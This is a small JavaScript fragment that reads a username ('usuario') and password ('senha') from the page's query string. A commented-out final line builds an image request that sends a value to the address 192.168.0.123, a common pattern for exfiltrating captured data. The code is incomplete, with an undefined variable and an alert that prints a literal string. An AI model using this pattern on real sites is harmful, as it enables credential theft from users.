var url   = window.location.search.replace("?", "");
var items = url.split("&");
var array = {
	'usuario' : items[0],
	'senha' : items[1]
}

alert('array.login');


// new Image().src = "http://192.168.0.123/?=" + retorno